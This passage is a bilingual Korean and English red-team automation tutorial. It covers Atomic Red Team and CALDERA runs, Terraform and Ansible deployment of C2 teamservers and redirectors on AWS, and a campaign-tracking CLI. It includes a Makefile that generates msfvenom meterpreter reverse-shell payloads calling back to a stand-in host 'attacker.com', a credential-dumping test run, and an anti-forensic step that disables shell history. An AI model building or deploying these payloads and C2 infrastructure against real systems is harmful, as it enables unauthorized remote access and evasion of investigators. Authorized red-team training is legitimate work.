  git clone https://github.com/redcanaryco/atomic-red-team
  
  실행 (PowerShell):
  Install-Module -Name invoke-atomicredteam
  Invoke-AtomicTest T1003.001 -TestNumbers 1
  Invoke-AtomicTest T1059.001 -GetPrereqs
  Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3
  
  결과 정리:
  Invoke-AtomicTest All -LoggingModule "Attire-ExecutionLogger"
```

### 6.2 CALDERA 자동화 에이전트

```yaml
# CALDERA 작전 설정 예시
name: "레드팀 자동화 테스트"
adversary:
  name: "APT-Simulation"
  description: "APT 그룹 시뮬레이션"
  atomic_ordering:
    - ability: "집계 호스트 정보 (Tactic: Discovery)"
      id: "1a98b8ea-57d9-4abe-9dd2-6f2f6fc794da"
    - ability: "프로세스 목록 수집"
      id: "8099bc58-94b8-4b24-94de-ccca28aaed1e"
    - ability: "자격증명 수집"
      id: "90c2efaa-8205-480d-8bb6-61d90dbaf81b"
```

---

## 7. 실전 레드팀 인프라 구성 (AWS 기반)

### 7.1 전체 아키텍처

```
AWS 레드팀 인프라 (공인 작전 전용):

┌─────────────────────────────────────────────┐
│                  Internet                    │
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│            Cloudflare CDN                    │
│  - DDoS 방어                                 │
│  - 원본 IP 숨김                              │
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│         AWS Region (us-east-1)               │
│                                             │
│  ┌──────────────────────────────────────┐  │
│  │         Public Subnet (10.100.1.0/24) │  │
│  │                                      │  │
│  │  [Redirector-01]    [Redirector-02]  │  │
│  │  t3.micro           t3.micro         │  │
│  │  Nginx              Apache           │  │
│  │  Port 80/443        Port 80/443      │  │
│  └──────────────────────────────────────┘  │
│              │            │                 │
│              ▼            ▼                 │
│  ┌──────────────────────────────────────┐  │
│  │        Private Subnet (10.100.2.0/24)│  │
│  │                                      │  │
│  │      [C2 Teamserver]                 │  │
│  │      t3.medium                       │  │
│  │      Sliver/Cobalt Strike            │  │
│  │      포트: 운영자 IP만 허용           │  │
│  └──────────────────────────────────────┘  │
│                                             │
│  [S3 Bucket] - 페이로드 호스팅              │
│  [CloudWatch] - 로그 수집                   │
└─────────────────────────────────────────────┘

비용 예상 (월):
  - EC2 t3.micro × 2 (리다이렉터): ~$17
  - EC2 t3.medium × 1 (팀서버):    ~$30
  - 도메인 × 2:                    ~$20/년
  - 합계:                          ~$50/월
```

### 7.2 배포 스크립트

```bash
#!/bin/bash
# 레드팀 인프라 배포 스크립트 (공인 작전 전용)

set -euo pipefail

CAMPAIGN_NAME="${1:-redteam-$(date +%Y%m%d)}"
OPERATOR_IP="${2:-$(curl -s ifconfig.me)/32}"
REGION="${3:-us-east-1}"

echo "[*] 캠페인: $CAMPAIGN_NAME"
echo "[*] 운영자 IP: $OPERATOR_IP"
echo "[*] 리전: $REGION"

# 1. SSH 키 생성
ssh-keygen -t ed25519 -f "${CAMPAIGN_NAME}_key" -N "" -C "${CAMPAIGN_NAME}"
PUBLIC_KEY=$(cat "${CAMPAIGN_NAME}_key.pub")

# 2. tfvars 생성
cat > terraform.tfvars << EOF
region         = "${REGION}"
operator_ip    = "${OPERATOR_IP}"
ssh_public_key = "${PUBLIC_KEY}"
EOF

# 3. Terraform 배포
terraform init
terraform apply -var-file=terraform.tfvars -auto-approve

# 4. 출력 저장
terraform output -json > "${CAMPAIGN_NAME}_infra.json"

echo "[+] 배포 완료"
echo "[+] 인프라 정보: ${CAMPAIGN_NAME}_infra.json"

# 5. Ansible로 소프트웨어 설치
REDIRECTOR_IP=$(terraform output -raw redirector_public_ip)
ansible-playbook \
  -i "${REDIRECTOR_IP}," \
  --private-key "${CAMPAIGN_NAME}_key" \
  playbooks/deploy.yml

echo "[+] 설정 완료"
echo ""
echo "=== 사용법 ==="
echo "  리다이렉터: $REDIRECTOR_IP"
echo "  SSH: ssh -i ${CAMPAIGN_NAME}_key operator@$REDIRECTOR_IP"
```

---

## 참고 자료

- Terraform 공식 문서: https://registry.terraform.io/providers/hashicorp/aws
- Ansible 공식 문서: https://docs.ansible.com/
- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
- MITRE CALDERA: https://github.com/mitre/caldera
- "Infrastructure as Code" - Kief Morris
- MITRE ATT&CK 프레임워크: https://attack.mitre.org/

---

<!-- detect-validate-49 -->
## 공격 탐지와 방어 검증

레드팀 인프라는 *어떻게 들키지 않고 운영하는가*를 다루지만, 방어자 관점에서는 **그 인프라가 네트워크 텔레메트리에 남는가**와 **탐지가 실제로 잡는가**를 검증해야 한다. 레드팀도 이 관점으로 자기 OPSEC 의 실효성을 가늠할 수 있다.

### 공격 → 완화 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 완화 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| 자동 배포/IaC | - | IaC 검토, 시크릿 관리(Vault) | 하드코딩 키/토큰 노출 |
| 대량 페이로드 생성 | AV/EDR | 빌드 검증, 변종 다양화 | 동일 정적 시그니처 다수 변종 |
| 자동화 인프라 접근 | - | 감사 로깅, 접근통제·MFA | 자동화 콘솔 무인증 접근 |

### 방어 검증 (직접 확인)

```bash
# 1) 자동화 코드/IaC 에 시크릿이 하드코딩됐는지 사실 확인(레드팀도 OPSEC 위반)
grep -rnE 'AKIA[0-9A-Z]{16}|api[_-]?key|token=' ./automation || echo "하드코딩 시크릿 0건"
# 2) 생성된 페이로드들이 동일 정적 해시/시그니처를 공유하지 않는지(클러스터링 위험)
for p in payloads/*.bin; do sha256sum "$p"; done | awk '{print $1}' | sort | uniq -c
# 3) 자동화 인프라가 인증·접근통제로 보호되는지 검토
```

> 검증은 반드시 **소유한 시스템·통제된 환경**에서만 수행한다. 완화를 "설정했다"와 "런타임에 실제 막힌다"는 다르다 — PoC 를 재현해 완화가 차단하는지 확인해야 신뢰할 수 있다([[68_Purple_Team]]).

**최신 기법·통제 (2025–2026):**
- IaC 기반 C2/리다이렉터 자동 배포가 확산 — 검증: 배포가 재현·격리되는가(승인 하)([[18_DevSecOps]])
- 스코프 게이트 — 강제되는지 확인

---


<a name="english"></a>

# Red Team Automation

> **Purpose**: Learning material for educational, research, CTF, and authorized red team operation environments

---

## 1. Red Team Automation Overview

### 1.1 Automation Maturity Model

```
Level 0: Fully Manual
  - All tasks executed manually
  - Tools: Metasploit, Burp Suite, manual commands
  - Drawbacks: Slow, labor-intensive, lots of repetitive tasks
  - Suitable for: Small targets, exploratory testing

Level 1: Semi-Automated
  - Repetitive tasks scripted
  - Decision-making performed by humans
  - Tools: Python scripts, Bash automation, Ansible
  - Drawbacks: Still requires supervision
  - Suitable for: General red team operations

Level 2: Fully Automated
  - BAS (Breach and Attack Simulation)
  - Automatic exploit → pivot → objective achievement
  - Tools: Caldera, VECTR, AttackIQ, Prelude
  - Drawbacks: Limited in complex environments
  - Suitable for: Continuous security validation, CTEM

Red team automation targets:
  ├── Infrastructure deployment (Terraform/Ansible)
  ├── Payload generation pipeline
  ├── Reconnaissance/scanning automation
  ├── Vulnerability identification and prioritization
  ├── Automated report generation
  └── Detection evasion testing
```

### 1.2 Automation Principles

```
1. Idempotency
   - Same result regardless of how many times the same task is run
   - Core principle of Terraform and Ansible

2. Version Control
   - Manage all infrastructure code with Git
   - Environment-specific branches (dev/staging/prod)

3. Secret Management
   - No hardcoding
   - Vault, AWS Secrets Manager, environment variables

4. Cleanup
   - Automated cleanup after operations
   - Minimize cost and exposure
```

---

## 2. Ansible C2 Infrastructure Automated Deployment

### 2.1 Ansible Directory Structure

```
redteam-ansible/
├── inventory/
│   ├── hosts.yml           # Inventory file
│   └── group_vars/
│       ├── all.yml         # Common variables
│       ├── c2_servers.yml  # C2 server variables
│       └── redirectors.yml # Redirector variables
├── roles/
│   ├── common/             # Common hardening
│   ├── c2_server/          # C2 server installation
│   ├── redirector/         # Redirector configuration
│   └── cleanup/            # Cleanup tasks
├── playbooks/
│   ├── deploy.yml          # Full deployment
│   ├── teardown.yml        # Full teardown
│   └── update.yml          # Updates
└── vault/
    └── secrets.yml         # Encrypted secrets
```

### 2.2 Inventory File

```yaml
# inventory/hosts.yml
all:
  children:
    c2_servers:
      hosts:
        teamserver-01:
          ansible_host: 10.0.0.5
          ansible_user: operator
          ansible_ssh_private_key_file: ~/.ssh/redteam_key
          c2_type: sliver
          c2_port: 8888

    redirectors:
      hosts:
        redirector-01:
          ansible_host: 1.2.3.4
          ansible_user: operator
          ansible_ssh_private_key_file: ~/.ssh/redteam_key
          redirect_port: 443
          backend_host: "{{ hostvars['teamserver-01']['ansible_host'] }}"
          backend_port: 8888

        redirector-02:
          ansible_host: 5.6.7.8
          ansible_user: operator
          ansible_ssh_private_key_file: ~/.ssh/redteam_key
          redirect_port: 80
          backend_host: "{{ hostvars['teamserver-01']['ansible_host'] }}"
          backend_port: 8080
```

### 2.3 Common Hardening Role

```yaml
# roles/common/tasks/main.yml
---
- name: Update packages
  ansible.builtin.apt:
    update_cache: true
    upgrade: safe
  become: true

- name: Install required packages
  ansible.builtin.apt:
    name:
      - ufw
      - fail2ban
      - curl
      - wget
      - unzip
      - socat
    state: present
  become: true

- name: Harden SSH configuration
  ansible.builtin.lineinfile:
    path: /etc/ssh/sshd_config
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    state: present
  become: true
  loop:
    - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin no' }
    - { regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication no' }
    - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 3' }
  notify: restart sshd

- name: Set UFW default policies
  community.general.ufw:
    state: enabled
    policy: "{{ item.policy }}"
    direction: "{{ item.direction }}"
  become: true
  loop:
    - { policy: deny,  direction: incoming }
    - { policy: allow, direction: outgoing }

- name: Allow operator IP SSH access
  community.general.ufw:
    rule: allow
    from_ip: "{{ operator_ip }}"
    to_port: "22"
    proto: tcp
  become: true
  when: operator_ip is defined

- name: Enable Fail2ban
  ansible.builtin.systemd:
    name: fail2ban
    enabled: true
    state: started
  become: true

- name: Disable Bash history
  ansible.builtin.lineinfile:
    path: /home/{{ ansible_user }}/.bashrc
    line: "{{ item }}"
    state: present
  loop:
    - 'export HISTFILE=/dev/null'
    - 'export HISTSIZE=0'

handlers:
  - name: restart sshd
    ansible.builtin.service:
      name: sshd
      state: restarted
    become: true
```

### 2.4 Redirector Role

```yaml
# roles/redirector/tasks/main.yml
---
- name: Install Nginx
  ansible.builtin.apt:
    name: nginx
    state: present
  become: true

- name: Deploy Nginx redirector configuration
  ansible.builtin.template:
    src: redirector.conf.j2
    dest: /etc/nginx/sites-available/redirector.conf
    owner: root
    group: root
    mode: '0644'
  become: true
  notify: restart nginx

- name: Disable default site
  ansible.builtin.file:
    path: /etc/nginx/sites-enabled/default
    state: absent
  become: true

- name: Enable redirector site
  ansible.builtin.file:
    src: /etc/nginx/sites-available/redirector.conf
    dest: /etc/nginx/sites-enabled/redirector.conf
    state: link
  become: true
  notify: restart nginx

- name: Allow UFW HTTP/HTTPS
  community.general.ufw:
    rule: allow
    port: "{{ item }}"
    proto: tcp
  become: true
  loop:
    - "80"
    - "443"

handlers:
  - name: restart nginx
    ansible.builtin.service:
      name: nginx
      state: restarted
    become: true
```

### 2.5 Deployment Playbook

```yaml
# playbooks/deploy.yml
---
- name: Apply common hardening
  hosts: all
  gather_facts: true
  roles:
    - common

- name: Deploy C2 server
  hosts: c2_servers
  gather_facts: true
  vars_files:
    - ../vault/secrets.yml
  roles:
    - c2_server

- name: Deploy redirectors
  hosts: redirectors
  gather_facts: true
  roles:
    - redirector

# Run with:
# ansible-playbook -i inventory/hosts.yml playbooks/deploy.yml
# ansible-playbook -i inventory/hosts.yml playbooks/deploy.yml --ask-vault-pass
```

---

## 3. Terraform Cloud Attack Infrastructure

### 3.1 AWS-Based Red Team Infrastructure

```hcl
# main.tf - Red team AWS infrastructure (educational use)

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.region
}

# Variable definitions
variable "region" {
  default = "us-east-1"
}

variable "operator_ip" {
  description = "Operator public IP (CIDR)"
  type        = string
}

variable "ssh_public_key" {
  description = "SSH public key"
  type        = string
}

# Create VPC
resource "aws_vpc" "redteam" {
  cidr_block           = "10.100.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true

  tags = {
    Name = "redteam-vpc"
  }
}

# Subnet (public)
resource "aws_subnet" "public" {
  vpc_id                  = aws_vpc.redteam.id
  cidr_block              = "10.100.1.0/24"
  availability_zone       = "${var.region}a"
  map_public_ip_on_launch = true

  tags = { Name = "redteam-public" }
}

# Subnet (private - for team server)
resource "aws_subnet" "private" {
  vpc_id            = aws_vpc.redteam.id
  cidr_block        = "10.100.2.0/24"
  availability_zone = "${var.region}a"

  tags = { Name = "redteam-private" }
}

# Internet Gateway
resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.redteam.id
  tags   = { Name = "redteam-igw" }
}

# Public route table
resource "aws_route_table" "public" {
  vpc_id = aws_vpc.redteam.id

  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.igw.id
  }
}

resource "aws_route_table_association" "public" {
  subnet_id      = aws_subnet.public.id
  route_table_id = aws_route_table.public.id
}

# SSH key pair
resource "aws_key_pair" "operator" {
  key_name   = "redteam-operator"
  public_key = var.ssh_public_key
}

# Redirector security group
resource "aws_security_group" "redirector" {
  name   = "redteam-redirector-sg"
  vpc_id = aws_vpc.redteam.id

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTP from anywhere"
  }

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTPS from anywhere"
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.operator_ip]
    description = "SSH from operator"
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "redteam-redirector-sg" }
}

# C2 team server security group (private)
resource "aws_security_group" "teamserver" {
  name   = "redteam-teamserver-sg"
  vpc_id = aws_vpc.redteam.id

  ingress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.redirector.id]
    description     = "C2 from redirectors only"
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.operator_ip]
    description = "SSH from operator"
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = { Name = "redteam-teamserver-sg" }
}

# Redirector EC2 instance
resource "aws_instance" "redirector" {
  ami                    = "ami-0c02fb55956c7d316"  # Amazon Linux 2
  instance_type          = "t3.micro"
  subnet_id              = aws_subnet.public.id
  key_name               = aws_key_pair.operator.key_name
  vpc_security_group_ids = [aws_security_group.redirector.id]

  user_data = <<-EOF
    #!/bin/bash
    yum install -y nginx
    systemctl enable nginx
    systemctl start nginx
    # Additional configuration via Ansible on actual deployment
  EOF

  tags = { Name = "redteam-redirector-01" }
}

# Outputs
output "redirector_public_ip" {
  value = aws_instance.redirector.public_ip
}
```

### 3.2 Terraform Workflow

```bash
# Initialize
terraform init

# Create variables file (do NOT commit to git!)
cat > terraform.tfvars << 'EOF'
region         = "us-east-1"
operator_ip    = "203.0.113.0/32"
ssh_public_key = "ssh-ed25519 AAAA..."
EOF

# Review plan
terraform plan -var-file=terraform.tfvars

# Deploy
terraform apply -var-file=terraform.tfvars -auto-approve

# Check infrastructure info
terraform output

# Full teardown (end of operation)
terraform destroy -var-file=terraform.tfvars -auto-approve
```

---

## 4. Automated Payload Generation Pipeline

### 4.1 Pipeline Structure

```
Payload Generation Pipeline:

1. Collect target environment information
   └─ OS, architecture, AV/EDR information

2. Select payload base
   └─ msfvenom / sRDI / custom loader

3. Shellcode processing
   └─ XOR encryption
   └─ AES encryption
   └─ Compression

4. Select loader
   └─ EXE / DLL / PS1 / HTA / ISO

5. Compile
   └─ MinGW (cross-compilation)
   └─ Go build

6. Validate
   └─ Binary integrity check
   └─ Functional test (sandbox)

7. Deploy
   └─ Upload to payload server
```

### 4.2 Payload Generation Makefile

```makefile
# Makefile - Payload build automation

C2_HOST    := attacker.com
C2_PORT    := 443
OUTPUT_DIR := ./payloads

.PHONY: all clean windows linux macos

all: windows linux

windows:
	@mkdir -p $(OUTPUT_DIR)/windows
	msfvenom \
		-p windows/x64/meterpreter/reverse_https \
		LHOST=$(C2_HOST) LPORT=$(C2_PORT) \
		-f exe -o $(OUTPUT_DIR)/windows/payload_x64.exe
	msfvenom \
		-p windows/x86/meterpreter/reverse_https \
		LHOST=$(C2_HOST) LPORT=$(C2_PORT) \
		-f exe -o $(OUTPUT_DIR)/windows/payload_x86.exe
	msfvenom \
		-p windows/x64/meterpreter/reverse_https \
		LHOST=$(C2_HOST) LPORT=$(C2_PORT) \
		-f ps1 -o $(OUTPUT_DIR)/windows/payload.ps1
	@echo "[+] Windows payload generation complete"

linux:
	@mkdir -p $(OUTPUT_DIR)/linux
	msfvenom \
		-p linux/x64/meterpreter/reverse_tcp \
		LHOST=$(C2_HOST) LPORT=4444 \
		-f elf -o $(OUTPUT_DIR)/linux/payload_x64
	chmod +x $(OUTPUT_DIR)/linux/payload_x64
	@echo "[+] Linux payload generation complete"

clean:
	rm -rf $(OUTPUT_DIR)
	@echo "[+] Cleanup complete"
```

---

## 5. Red Team Campaign Management CLI

```python
#!/usr/bin/env python3
"""
Red team campaign management CLI
- Target management
- Session tracking
- Notes and findings recording
- Automated report generation
For CTF/authorized red team operations only
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any


class TargetStatus(Enum):
    PENDING    = "pending"
    IN_SCOPE   = "in_scope"
    SCANNING   = "scanning"
    EXPLOITED  = "exploited"
    COMPLETED  = "completed"
    OUT_SCOPE  = "out_scope"


class Severity(Enum):
    CRITICAL = "critical"
    HIGH     = "high"
    MEDIUM   = "medium"
    LOW      = "low"
    INFO     = "info"


@dataclass
class Target:
    target_id: str
    hostname: str
    ip_address: str
    os_info: str = ""
    status: str = TargetStatus.PENDING.value
    tags: list[str] = field(default_factory=list)
    notes: str = ""
    added_at: str = field(default_factory=lambda: datetime.now().isoformat())
    updated_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Session:
    session_id: str
    target_id: str
    session_type: str   # meterpreter, shell, beacon, etc.
    username: str
    pid: int
    arch: str
    is_elevated: bool = False
    established_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_active: str = field(default_factory=lambda: datetime.now().isoformat())
    notes: str = ""


@dataclass
class Finding:
    finding_id: str
    target_id: str
    title: str
    severity: str
    description: str
    evidence: str = ""
    mitigation: str = ""
    cve: str = ""
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Campaign:
    name: str
    description: str
    client: str
    start_date: str
    end_date: str
    scope: list[str] = field(default_factory=list)
    targets: list[Target] = field(default_factory=list)
    sessions: list[Session] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class CampaignManager:
    """Campaign data management"""

    def __init__(self, data_dir: Path) -> None:
        self.data_dir = data_dir
        self.data_dir.mkdir(parents=True, exist_ok=True)
        self.campaign_file = data_dir / "campaign.json"
        self.campaign: Campaign | None = None

    def _save(self) -> None:
        if self.campaign is None:
            return
        with open(self.campaign_file, "w", encoding="utf-8") as f:
            json.dump(asdict(self.campaign), f, ensure_ascii=False, indent=2)

    def _load(self) -> bool:
        if not self.campaign_file.exists():
            return False
        try:
            with open(self.campaign_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            targets = [Target(**t) for t in data.get("targets", [])]
            sessions = [Session(**s) for s in data.get("sessions", [])]
            findings = [Finding(**f) for f in data.get("findings", [])]
            self.campaign = Campaign(
                name=data["name"],
                description=data["description"],
                client=data["client"],
                start_date=data["start_date"],
                end_date=data["end_date"],
                scope=data.get("scope", []),
                targets=targets,
                sessions=sessions,
                findings=findings,
                created_at=data.get("created_at", ""),
            )
            return True
        except (KeyError, TypeError, json.JSONDecodeError) as e:
            print(f"[-] Failed to load campaign: {e}")
            return False

    def ensure_loaded(self) -> None:
        if self.campaign is None:
            if not self._load():
                print("[-] No campaign found. Run 'campaign new' first.")
                sys.exit(1)

    # Campaign management
    def new_campaign(
        self,
        name: str,
        client: str,
        description: str,
        start_date: str,
        end_date: str,
    ) -> None:
        self.campaign = Campaign(
            name=name,
            description=description,
            client=client,
            start_date=start_date,
            end_date=end_date,
        )
        self._save()
        print(f"[+] Campaign created: {name}")

    def show_campaign(self) -> None:
        self.ensure_loaded()
        c = self.campaign
        assert c is not None
        print(f"\nCampaign:    {c.name}")
        print(f"Client:      {c.client}")
        print(f"Period:      {c.start_date} ~ {c.end_date}")
        print(f"Description: {c.description}")
        print(f"\nStats:")
        print(f"  Targets:  {len(c.targets)}")
        print(f"  Sessions: {len(c.sessions)}")
        print(f"  Findings: {len(c.findings)}")
        if c.scope:
            print(f"\nScope:")
            for s in c.scope:
                print(f"  - {s}")

    # Target management
    def add_target(
        self,
        hostname: str,
        ip: str,
        os_info: str = "",
        tags: list[str] | None = None,
    ) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        target_id = f"T{len(self.campaign.targets)+1:03d}"
        target = Target(
            target_id=target_id,
            hostname=hostname,
            ip_address=ip,
            os_info=os_info,
            tags=tags or [],
        )
        self.campaign.targets.append(target)
        self._save()
        print(f"[+] Target added: [{target_id}] {hostname} ({ip})")

    def list_targets(self, status_filter: str | None = None) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        targets = self.campaign.targets
        if status_filter:
            targets = [t for t in targets if t.status == status_filter]

        if not targets:
            print("[-] No targets")
            return

        print(f"\n{'ID':<8} {'Hostname':<25} {'IP':<18} {'OS':<20} {'Status':<15} {'Tags'}")
        print("-" * 100)
        for t in targets:
            tags_str = ", ".join(t.tags) if t.tags else "-"
            print(f"{t.target_id:<8} {t.hostname:<25} {t.ip_address:<18} {t.os_info:<20} {t.status:<15} {tags_str}")

    def update_target_status(self, target_id: str, status: str) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        for t in self.campaign.targets:
            if t.target_id == target_id:
                t.status = status
                t.updated_at = datetime.now().isoformat()
                self._save()
                print(f"[+] Target status updated: {target_id} → {status}")
                return
        print(f"[-] Target not found: {target_id}")

    def add_target_note(self, target_id: str, note: str) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        for t in self.campaign.targets:
            if t.target_id == target_id:
                t.notes += f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M')}] {note}"
                t.updated_at = datetime.now().isoformat()
                self._save()
                print(f"[+] Note added: {target_id}")
                return
        print(f"[-] Target not found: {target_id}")

    # Session management
    def add_session(
        self,
        target_id: str,
        session_type: str,
        username: str,
        pid: int,
        arch: str,
        elevated: bool = False,
    ) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        session_id = f"S{len(self.campaign.sessions)+1:03d}"
        session = Session(
            session_id=session_id,
            target_id=target_id,
            session_type=session_type,
            username=username,
            pid=pid,
            arch=arch,
            is_elevated=elevated,
        )
        self.campaign.sessions.append(session)
        self._save()
        elevated_str = " [ELEVATED]" if elevated else ""
        print(f"[+] Session added: [{session_id}] {target_id} - {username}{elevated_str}")

    def list_sessions(self) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        sessions = self.campaign.sessions
        if not sessions:
            print("[-] No sessions")
            return

        print(f"\n{'ID':<8} {'Target':<8} {'User':<20} {'Type':<15} {'PID':<8} {'Privilege'}")
        print("-" * 75)
        for s in sessions:
            elevated = "Admin" if s.is_elevated else "Normal"
            print(f"{s.session_id:<8} {s.target_id:<8} {s.username:<20} {s.session_type:<15} {s.pid:<8} {elevated}")

    # Findings management
    def add_finding(
        self,
        target_id: str,
        title: str,
        severity: str,
        description: str,
        evidence: str = "",
        mitigation: str = "",
        cve: str = "",
    ) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        finding_id = f"F{len(self.campaign.findings)+1:03d}"
        finding = Finding(
            finding_id=finding_id,
            target_id=target_id,
            title=title,
            severity=severity,
            description=description,
            evidence=evidence,
            mitigation=mitigation,
            cve=cve,
        )
        self.campaign.findings.append(finding)
        self._save()
        print(f"[+] Finding added: [{finding_id}] [{severity.upper()}] {title}")

    def list_findings(self, severity_filter: str | None = None) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        findings = self.campaign.findings
        if severity_filter:
            findings = [f for f in findings if f.severity == severity_filter]

        if not findings:
            print("[-] No findings")
            return

        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        findings = sorted(findings, key=lambda f: sev_order.get(f.severity, 99))

        print(f"\n{'ID':<8} {'Severity':<12} {'Target':<8} {'Title':<40} {'CVE'}")
        print("-" * 80)
        for f in findings:
            print(f"{f.finding_id:<8} {f.severity.upper():<12} {f.target_id:<8} {f.title[:40]:<40} {f.cve or '-'}")

    # Report generation
    def generate_report(self, output_format: str = "txt", output_path: str | None = None) -> None:
        self.ensure_loaded()
        assert self.campaign is not None
        c = self.campaign

        if output_format == "txt":
            report = self._generate_text_report(c)
            ext = "txt"
        elif output_format == "json":
            report = json.dumps(asdict(c), ensure_ascii=False, indent=2)
            ext = "json"
        elif output_format == "csv":
            report = self._generate_csv_report(c)
            ext = "csv"
        else:
            print(f"[-] Unsupported format: {output_format}")
            return

        out_path = output_path or f"redteam_report_{datetime.now().strftime('%Y%m%d_%H%M')}.{ext}"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(report)
        print(f"[+] Report generated: {out_path}")

    def _generate_text_report(self, c: Campaign) -> str:
        lines = [
            "=" * 70,
            f"Red Team Operation Report",
            "=" * 70,
            f"",
            f"Campaign:    {c.name}",
            f"Client:      {c.client}",
            f"Period:      {c.start_date} ~ {c.end_date}",
            f"Description: {c.description}",
            f"",
            "[ Statistics Summary ]",
            f"  Total Targets:       {len(c.targets)}",
            f"  Successful Exploits: {sum(1 for t in c.targets if t.status == 'exploited')}",
            f"  Active Sessions:     {len(c.sessions)}",
            f"  Findings:            {len(c.findings)}",
            f"",
        ]

        sev_counts = {s.value: 0 for s in Severity}
        for f in c.findings:
            if f.severity in sev_counts:
                sev_counts[f.severity] += 1
        lines += [
            "[ Findings Summary ]",
            f"  CRITICAL: {sev_counts['critical']}",
            f"  HIGH:     {sev_counts['high']}",
            f"  MEDIUM:   {sev_counts['medium']}",
            f"  LOW:      {sev_counts['low']}",
            f"  INFO:     {sev_counts['info']}",
            "",
            "=" * 70,
            "[ Target List ]",
            "=" * 70,
        ]

        for t in c.targets:
            lines += [
                f"",
                f"[{t.target_id}] {t.hostname} ({t.ip_address})",
                f"  OS:     {t.os_info or 'N/A'}",
                f"  Status: {t.status}",
                f"  Tags:   {', '.join(t.tags) or 'N/A'}",
            ]
            if t.notes:
                lines.append(f"  Notes:  {t.notes.strip()}")

        lines += [
            "",
            "=" * 70,
            "[ Findings Detail ]",
            "=" * 70,
        ]

        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(c.findings, key=lambda f: sev_order.get(f.severity, 99))

        for f in sorted_findings:
            lines += [
                f"",
                f"[{f.finding_id}] [{f.severity.upper()}] {f.title}",
                f"  Target:      {f.target_id}",
                f"  CVE:         {f.cve or 'N/A'}",
                f"  Description: {f.description}",
                f"  Evidence:    {f.evidence or 'N/A'}",
                f"  Mitigation:  {f.mitigation or 'N/A'}",
                f"  Discovered:  {f.discovered_at[:10]}",
            ]

        lines += ["", "=" * 70, "End of Report", "=" * 70]
        return "\n".join(lines)

    def _generate_csv_report(self, c: Campaign) -> str:
        import io
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["Finding ID", "Target ID", "Title", "Severity", "CVE", "Description", "Discovered At"])
        for f in c.findings:
            writer.writerow([f.finding_id, f.target_id, f.title, f.severity, f.cve, f.description, f.discovered_at])
        return buf.getvalue()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Red team campaign management CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--data-dir", default="./campaign_data",
        help="Data storage directory (default: ./campaign_data)",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # campaign subcommand
    camp = subparsers.add_parser("campaign", help="Campaign management")
    camp_sub = camp.add_subparsers(dest="campaign_action", required=True)

    new_camp = camp_sub.add_parser("new", help="Create new campaign")
    new_camp.add_argument("--name", required=True)
    new_camp.add_argument("--client", required=True)
    new_camp.add_argument("--description", default="")
    new_camp.add_argument("--start", required=True, help="Start date (YYYY-MM-DD)")
    new_camp.add_argument("--end", required=True, help="End date (YYYY-MM-DD)")

    camp_sub.add_parser("show", help="Display campaign information")

    # target subcommand
    tgt = subparsers.add_parser("target", help="Target management")
    tgt_sub = tgt.add_subparsers(dest="target_action", required=True)

    add_tgt = tgt_sub.add_parser("add", help="Add target")
    add_tgt.add_argument("--hostname", required=True)
    add_tgt.add_argument("--ip", required=True)
    add_tgt.add_argument("--os", default="", dest="os_info")
    add_tgt.add_argument("--tags", nargs="*", default=[])

    ls_tgt = tgt_sub.add_parser("list", help="List targets")
    ls_tgt.add_argument("--status", help="Status filter")

    up_tgt = tgt_sub.add_parser("status", help="Change target status")
    up_tgt.add_argument("id")
    up_tgt.add_argument("new_status")

    note_tgt = tgt_sub.add_parser("note", help="Add target note")
    note_tgt.add_argument("id")
